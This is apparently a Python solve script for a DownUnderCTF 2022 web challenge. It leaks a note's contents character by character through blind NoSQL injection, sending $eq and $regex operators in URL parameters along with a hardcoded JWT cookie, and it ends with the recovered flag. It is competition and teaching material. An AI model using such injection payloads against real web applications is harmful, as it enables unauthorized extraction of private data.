import requests
import string

domain = string.ascii_lowercase + string.ascii_uppercase + string.digits + ",}{_.:!@$^&*()#"
flag='DUCTF{n0sql1'
url ='https://web-noteworthy-873b7c844f49.2022.ductf.dev/edit?noteId[$eq]=1337&'
kukis= {"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2MzJlZDNiYTkwODhjYzMxNWI3MDY3NDMiLCJpYXQiOjE2NjQwMTMyODIsImV4cCI6MTY2NDYxODA4Mn0.ElsVfJFbbvwPI62olBWLG5T6WFIJVj2Oz8-54dwObw0"}

while True:
  for c in domain:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload=f"contents[$regex]=^{flag + c}"
      print(url+payload)
      r = requests.get(url + payload,cookies=kukis)
      print(c)
      if 'You are not the owner of this note!' in r.text:
        print(f"Found one more char : {flag+c}")
        flag += c
        break

#DUCTF{n0sql1_1s_th3_new_5qli}